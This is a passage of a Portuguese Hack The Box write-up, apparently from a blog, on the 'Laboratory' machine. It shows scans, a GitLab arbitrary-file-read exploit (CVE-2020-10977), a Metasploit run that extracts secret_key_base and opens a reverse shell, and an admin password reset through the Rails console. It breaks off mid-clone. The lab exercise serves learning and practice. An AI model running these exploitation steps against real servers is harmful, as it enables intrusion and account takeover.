@@ -1,0 +1,1420 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.21.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Hackthebox write-up: Laboratory | Davi Cruz</title>
+<meta name="description" content="Olá pessoal!  A máquina desta semana será Laboratory, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xc45.">
+
+
+  <meta name="author" content="Davi Cruz">
+  
+  <meta property="article:author" content="Davi Cruz">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Davi Cruz">
+<meta property="og:title" content="Hackthebox write-up: Laboratory">
+<meta property="og:url" content="https://davicruz.com/writeup/2021/04/htb-laboratory/">
+
+
+  <meta property="og:description" content="Olá pessoal!  A máquina desta semana será Laboratory, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xc45.">
+
+
+
+  <meta property="og:image" content="https://i.imgur.com/t7eWqy0.png">
+
+
+
+  <meta name="twitter:site" content="@zerahzurc">
+  <meta name="twitter:title" content="Hackthebox write-up: Laboratory">
+  <meta name="twitter:description" content="Olá pessoal!  A máquina desta semana será Laboratory, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xc45.">
+  <meta name="twitter:domain" content="davicruz.com">
+  <meta name="twitter:url" content="https://davicruz.com/writeup/2021/04/htb-laboratory/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="https://i.imgur.com/t7eWqy0.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-04-17T13:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://davicruz.com/writeup/2021/04/htb-laboratory/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Davi Cruz",
+      "url": "https://davicruz.com/",
+      "sameAs": ["https://twitter.com/zerahzurc","https://www.linkedin.com/in/davicruz","https://github.com/davi-cruz"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="hrWV-PqvbpxEy2HdpVYFQNws2Sz_tROleVyF18s2kWA" />
+
+
+  <meta name="msvalidate.01" content="60B1FA6CDAF15D226AB529AF30386BD8">
+
+
+
+  <meta name="yandex-verification" content="08de8d8c0326420f">
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Davi Cruz Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+<!-- Favicon -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico" />
+
+<!-- Multilang tags -->
+
+    
+<link rel="alternate" hreflang="pt-BR" href="/writeup/2021/04/htb-laboratory/">
+    
+
+    
+<link rel="alternate" hreflang="en-US" href="/en-US/writeup/2021/04/htb-laboratory/">
+    
+
+
+<!-- Cookie Consent - Osano -->
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.css" />
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          
+          <a class="site-logo" href="https://davicruz.com"><img src="/assets/images/logo.png" alt="Davi Cruz"></a>
+          
+          <a class="site-title" href="https://davicruz.com">
+            Davi Cruz
+            
+          </a>
+        
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+            <a href="/categorias/">Categorias</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/tags/">Tags</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/sobre/">Sobre</a>
+          </li>
+</ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Buscar</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/bio-photo.jpg" alt="Davi Cruz" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Davi Cruz</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Apenas mais um profissional de Cibersegurança</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Acompanhe no</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">São Paulo, BR</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fab fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+<li>
+  <strong></strong>
+  
+  <a class="link-en" href=""></a>
+  
+</li>
+
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hackthebox write-up: Laboratory">
+    <meta itemprop="description" content="Olá pessoal!A máquina desta semana será Laboratory, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xc45.">
+    <meta itemprop="datePublished" content="2021-04-17T13:00:00-03:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hackthebox write-up: Laboratory
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-04-17T13:00:00-03:00">April 17, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          10 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/04/htb-laboratory/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>Olá pessoal!</p>
+
+<p>A máquina desta semana será <strong>Laboratory</strong>, outra máquina Linux classificada como fácil do <a href="https://www.hackthebox.eu">Hack The Box</a>, criada por <a href="https://app.hackthebox.eu/users/73268">0xc45</a>. <!--more--></p>
+
+<p class="notice--info"><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas</p>
+
+<p><img src="https://i.imgur.com/6fqKuas.png" alt="HTB Laboratory" class="align-center"></p>
+
+<h2 id="enumeração">Enumeração</h2>
+
+<p>Conforme de costume, iniciamos com a enumeração básica dos serviços utilizando o <code class="language-plaintext highlighter-rouge">nmap</code> com um quick scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.216                                                                   
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-02-18 15:50 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.10.216
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 filtered ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d <span class="o">(</span>RSA<span class="o">)</span>
+|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to https://laboratory.htb/
+443/tcp open  ssl/http Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: The Laboratory
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
+| Subject Alternative Name: DNS:git.laboratory.htb
+| Not valid before: 2020-07-05T10:39:28
+|_Not valid after:  2024-03-03T10:39:28
+| tls-alpn: 
+|_  http/1.1
+Service Info: Host: laboratory.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>33.96 seconds
+</code></pre></div></div>
+
+<p>Após execução notamos que existem, além do serviço de SSH, dois serviços HTTP (HTTP e HTTPs em suas respectivas portas padrão) que fazem menção às entradas de DNS <code class="language-plaintext highlighter-rouge">laboratory.htb</code> e <code class="language-plaintext highlighter-rouge">git.laboratory.htb</code>, os quais foram incluidos no arquivo hosts da máquina para melhor enumeração destes serviços.</p>
+
+<h3 id="80tcp---serviço-http">80/TCP - Serviço HTTP</h3>
+
+<p>Uma vez acessado serviço HTTP tanto no IP quanto em qualquer um dos DNS que pudemos observar de acordo com o scan do <code class="language-plaintext highlighter-rouge">nmap</code>, ocorre um redirecionamento para o HTTPS, que funciona na porta 443/TCP, que será discutido a seguir.</p>
+
+<h3 id="443tcp---serviço-https">443/TCP - Serviço HTTPS</h3>
+
+<p>Ao enumerar os serviços HTTPS em ambos os DNS, pudemos notar algumas diferenças nos serviços publicados.</p>
+
+<h3 id="httpslaboratoryhtb"><code class="language-plaintext highlighter-rouge">https://laboratory.htb</code></h3>
+
+<p>Ao navegar para a página <code class="language-plaintext highlighter-rouge">https://laboratory.htb</code>, temos um site institucional relacionado a uma empresa de segurança com Dexter, Dee Dee e Anonymous como funcionários, porém nenhum link interessante para dar continuidade na exploração.</p>
+
+<p><img src="https://i.imgur.com/Fowr3Hn.png" alt="laboratory htb" class="align-center"></p>
+
+<h4 id="gobuster">Gobuster</h4>
+
+<p>Para verificar se alguma outra página existe neste website, realizei o scan utilizando o <code class="language-plaintext highlighter-rouge">gobuster</code> porém nada interessante foi encontrado.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> https://laboratory.htb <span class="nt">-x</span> html,php,txt <span class="nt">-k</span>
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            https://laboratory.htb
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Extensions:     html,php,txt
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2021/02/18 16:12:44 Starting gobuster
+<span class="o">===============================================================</span>
+/images <span class="o">(</span>Status: 301<span class="o">)</span>
+/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
+/assets <span class="o">(</span>Status: 301<span class="o">)</span>
+/CREDITS.txt <span class="o">(</span>Status: 200<span class="o">)</span>
+Progress: 38301 / 220561 <span class="o">(</span>17.37%<span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="httpsgitlaboratoryhtb"><code class="language-plaintext highlighter-rouge">https://git.laboratory.htb</code></h3>
+
+<p>Uma vez acessado o serviço, notado que se tratava de um servidor <a href="https://about.gitlab.com/">GitLab</a>, conforme podemos ver na imagem abaixo.</p>
+
+<p><img src="https://i.imgur.com/dL6VMKv.png" alt="gitab laboratory htb" class="align-center"></p>
+
+<p>Após algumas pesquisas, notei que na API V3 seria possivel realizar algumas enumerações não autenticadas, o que não foi possível neste caso, já que neste caso temos uma API V4.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-L</span> https://git.laboratory.htb/api/v3/internal/check <span class="nt">-k</span>                                               
+<span class="o">{</span><span class="s2">"error"</span>:<span class="s2">"API V3 is no longer supported. Use API V4 instead."</span><span class="o">}</span>                                           
+                                                                    
+<span class="nv">$ </span>curl <span class="nt">-L</span> https://git.laboratory.htb/api/v4/internal/check <span class="nt">-k</span>                                               
+<span class="o">{</span><span class="s2">"message"</span>:<span class="s2">"401 Unauthorized"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>Já que a enumeração via métodos encontrados em outros artigos também não funcionou, segui para a criação de uma conta, para qual foi requerido o uso de uma conta de um domínio autorizado (<em>laboratory.htb</em>) mas que mesmo assim foi criada com sucesso.</p>
+
+<p>Uma vez logado com a conta recém-criada, segui para a exploração dos repositórios públicos, onde encontrei um repositório chamado <strong>SecureWebSite</strong>.</p>
+
+<p><img src="https://i.imgur.com/2FARHEv.png" alt="gitlab projects" class="align-center"></p>
+
+<p>Ao navegar no repositório, pude notar de que se tratava do site publicado na URL <code class="language-plaintext highlighter-rouge">https://laboratory.htb</code>, de onde poderíamos obter alguma informação interessante, porém conforme já era esperado se trata apenas de um single page application sem funcionalidades que pudéssemos explorar.</p>
+
+<p>Entretanto, uma vez logado no portal, ao acessar o menu <em>Help &gt; Help</em> podemos identificar a versão do GitLab em execução, que é a 12.8.1 Community</p>
+
+<p><img src="https://i.imgur.com/ygc0H7j.png" alt="gitlab version" class="align-center"></p>
+
+<p>Buscando no <code class="language-plaintext highlighter-rouge">searchsploit</code> encontradas algumas vulnerabilidades que poderiam ser exploradas, identificadas como <strong>Arbitrary File Read</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit gitlab
+<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                         |  Path
+<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+GitLab - <span class="s1">'impersonate'</span> Feature Privilege Escalation                    | ruby/webapps/40236.txt
+GitLab 11.4.7 - RCE <span class="o">(</span>Authenticated<span class="o">)</span>                                    | ruby/webapps/49334.py
+Gitlab 11.4.7 - Remote Code Execution                                  | ruby/webapps/49257.py
+GitLab 11.4.7 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span>                  | ruby/webapps/49263.py
+GitLab 12.9.0 - Arbitrary File Read                                    | ruby/webapps/48431.txt
+Gitlab 12.9.0 - Arbitrary File Read <span class="o">(</span>Authenticated<span class="o">)</span>                    | ruby/webapps/49076.py
+Gitlab 6.0 - Persistent Cross-Site Scripting                           | php/webapps/30329.sh
+Gitlab-shell - Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                             | linux/remote/34362.rb
+Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting      | java/webapps/47927.txt
+NPMJS gitlabhook 0.0.17 - <span class="s1">'repository'</span> Remote Command Execution        | json/webapps/47420.txt
+<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>Após algumas tentativas com os scripts do searchsploit não obtive o sucesso esperado. Em nova busca acabei encontrando o <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10977">CVE-2020-10977 no MITRE</a> que está relacionado à esta vulnerabilidade e, a partir desta informação, encontrei outros exploits a serem testados, sendo o disponível no repositório <a href="https://github.com/thewhiteh4t/cve-2020-10977">thewhiteh4t/cve-2020-10977: GitLab 12.9.0 Arbitrary File Read (github.com)</a> o utilizado.</p>
+
+<p>Com este script, pude confirmar que o servidor continua vulnerável à exploração conforme possibilidade de obter o arquivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 ./cve_2020_10977.py https://git.laboratory.htb dummy P@ssw0rd                                   
+<span class="nt">----------------------------------</span>                                                                       
+<span class="nt">---</span> CVE-2020-10977 <span class="nt">---------------</span>       
+<span class="nt">---</span> GitLab Arbitrary File Read <span class="nt">---</span>               
+<span class="nt">---</span> 12.9.0 &amp; Below <span class="nt">---------------</span>    
+<span class="nt">----------------------------------</span>                                                                       
+                                                                                                         
+<span class="o">[&gt;]</span> Found By : vakzz       <span class="o">[</span> https://hackerone.com/reports/827052 <span class="o">]</span>
+<span class="o">[&gt;]</span> PoC By   : thewhiteh4t <span class="o">[</span> https://twitter.com/thewhiteh4t      <span class="o">]</span>
+                                                                                                         
+<span class="o">[</span>+] Target        : https://git.laboratory.htb                                                           
+<span class="o">[</span>+] Username      : dummy                                                                                
+<span class="o">[</span>+] Password      : P@ssw0rd
+<span class="o">[</span>+] Project Names : ProjectOne, ProjectTwo
+
+<span class="o">[!]</span> Trying to Login...         
+<span class="o">[</span>+] Login Successful!
+<span class="o">[!]</span> Creating ProjectOne...
+<span class="o">[</span>+] ProjectOne Created Successfully!
+<span class="o">[!]</span> Creating ProjectTwo...
+<span class="o">[</span>+] ProjectTwo Created Successfully!
+<span class="o">[&gt;]</span> Absolute Path to File : /etc/passwd
+<span class="o">[!]</span> Creating an Issue...
+<span class="o">[</span>+] Issue Created Successfully!
+<span class="o">[!]</span> Moving Issue...
+<span class="o">[</span>+] Issue Moved Successfully!
+<span class="o">[</span>+] File URL : https://git.laboratory.htb/dummy/ProjectTwo/uploads/09bddb24c9ac93d1a011f6ed14054a66/passwd
+
+<span class="o">&gt;</span> /etc/passwd
+</code></pre></div></div>
+
+<p>Verificando o conteúdo do <code class="language-plaintext highlighter-rouge">/etc/passwd</code> podemos notar que os usuários desta máquina, além de <em>root</em> e <em>ssh</em> foram criados e utilizam basicamente a mesma raiz de diretório em <code class="language-plaintext highlighter-rouge">/var/opt/gitlab</code>, onde vamos buscar por arquivos interessantes</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>etc_passwd | <span class="nb">grep </span>sh | <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">":"</span> <span class="s1">'{print $6","$1}'</span>
+/root,root
+/var/run/sshd,sshd
+/var/opt/gitlab,git
+/var/opt/gitlab/postgresql,gitlab-psql
+/var/opt/gitlab/mattermost,mattermost
+/var/opt/gitlab/registry,registry
+/var/opt/gitlab/prometheus,gitlab-prometheus
+/var/opt/gitlab/consul,gitlab-consul
+</code></pre></div></div>
+
+<h2 id="initial-foothold">Initial Foothold</h2>
+
+<p>Já sabendo das contas da máquina e da possibilidade de leitura de arquivos arbitrários, pesquisei sobre como converter essa possibilidade em RCE, para assim obter um shell reverso. Após algumas leituras encontrei <a href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">um módulo do Metasploit</a> que se utiliza desta mesma vulnerabilidade para obter o <code class="language-plaintext highlighter-rouge">secret_key_base</code> do GitLab, e assim, com uma chamada de deserialization do cookie emitido, obter um shell reverso com a conta <strong>git</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.10.10:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
+<span class="o">[</span>+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Logged <span class="k">in </span>to user jdoe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Created project /jdoe/vWL4JJIQ
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Created project /jdoe/NVfFvw3v
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Created issue /jdoe/vWL4JJIQ/issues/1
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing arbitrary file load
+<span class="o">[</span>+] File saved as: <span class="s1">'/home/zurc/.msf4/loot/20210219090516_default_10.10.10.216_gitlab.secrets_242811.txt'</span>
+<span class="o">[</span>+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file <span class="nb">read</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to delete project /jdoe/vWL4JJIQ
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Deleted project /jdoe/vWL4JJIQ
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to delete project /jdoe/NVfFvw3v
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Deleted project /jdoe/NVfFvw3v
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.10.10:4444 -&gt; 10.10.10.216:35138<span class="o">)</span> at 2021-02-19 09:05:22 <span class="nt">-0300</span>
+
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<p>Com acesso à máquina iniciada enumeração utilizando o <code class="language-plaintext highlighter-rouge">linpeas.sh</code> do <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/README.md">PEAS Suite</a> que me ajudou muito a entender as possibilidades de exploração do GitLab, uma vez que não conheço bem a implementação do serviço. O Script detecta o serviço instalado e trouxe algumas informações interessantes sobre a máquina em questão:</p>
+
+<ul>
+  <li>Enumeração das contas, onde pudemos notar que o usuário <strong>dexter</strong> (admin@example.com) é administrador.</li>
+  <li>Execução dentro de um docker container, onde futuramente precisaremos escapá-lo para a máquina de fato.</li>
+</ul>
+
+<p>Um dos pontos colocados pelo <code class="language-plaintext highlighter-rouge">linpeas.sh</code> durante a enumeração é a possibilidade de alterar a senha de qualquer usuário, o que tivemos sucesso a partir da execução dos comandos abaixo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git@git:~/gitlab-rails<span class="nv">$ </span>gitlab-rails console
+<span class="nt">--------------------------------------------------------------------------------</span>
+ GitLab:       12.8.1 <span class="o">(</span>d18b43a5f5a<span class="o">)</span> FOSS
+ GitLab Shell: 11.0.0
+ PostgreSQL:   10.12
+<span class="nt">--------------------------------------------------------------------------------</span>
+Loading production environment <span class="o">(</span>Rails 6.0.2<span class="o">)</span>
+irb<span class="o">(</span>main<span class="o">)</span>:001:0&gt; user <span class="o">=</span> User.find_by<span class="o">(</span>email: <span class="s2">"admin@example.com"</span><span class="o">)</span>
+<span class="o">=&gt;</span> <span class="c">#&lt;User id:1 @dexter&gt;</span>
+irb<span class="o">(</span>main<span class="o">)</span>:002:0&gt; user.password <span class="o">=</span> <span class="s2">"P@ssw0rd"</span>
+<span class="o">=&gt;</span> <span class="s2">"P@ssw0rd"</span>
+irb<span class="o">(</span>main<span class="o">)</span>:003:0&gt; user.password_confirmation <span class="o">=</span> <span class="s2">"P@ssw0rd"</span>
+<span class="o">=&gt;</span> <span class="s2">"P@ssw0rd"</span>
+irb<span class="o">(</span>main<span class="o">)</span>:004:0&gt; user.save!
+Enqueued ActionMailer::DeliveryJob <span class="o">(</span>Job ID: 0f18c1b4-9929-47a5-90d7-ec16a7e6f293<span class="o">)</span> to Sidekiq<span class="o">(</span>mailers<span class="o">)</span> with arguments: <span class="s2">"DeviseMailer"</span>, <span class="s2">"password_change"</span>, <span class="s2">"deliver_now"</span>, <span class="c">#&lt;GlobalID:0x00007fa424ee0668 @uri=#&lt;URI::GID gid://gitlab/User/1&gt;&gt;</span>
+<span class="o">=&gt;</span> <span class="nb">true
+</span>irb<span class="o">(</span>main<span class="o">)</span>:005:0&gt; 
+</code></pre></div></div>
+
+<p>Após alterada a senha, foi possível visualizar para a conta <code class="language-plaintext highlighter-rouge">dexter</code> um repositório privado adicional chamado <strong>SecureDocker</strong>.</p>
+
+<p><img src="https://i.imgur.com/oXJEKFR.png" alt="gitlab dexter projects" class="align-center"></p>
+
+<p>Já que temos acesso ao código-fonte do repositório, notado que existem alguns scripts e <strong>chave SSH</strong> do usuário dexter, conforme mencionado na descrição do repositório.</p>
+
+<blockquote>
+  <p>CONFIDENTIAL - Secure docker configuration for homeserver. Also some personal stuff, I’ll figure that out later.</p>
+</blockquote>
+
+<p>Após clonar o repositório para máquina local observados os seguintes arquivos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>git <span class="nt">-c</span> http.sslVerify<span class="o">=</span><span class="nb">false </span>clone http://git.laboratory.htb/dexter/securedocker.git  
+Cloning into <span class="s1">'securedocker'</span>...
+Username <span class="k">for</span> <span class="s1">'https://git.laboratory.htb'</span>: dexter
+Password <span class="k">for</span> <span class="s1">'https://dexter@git.laboratory.htb'</span>: 
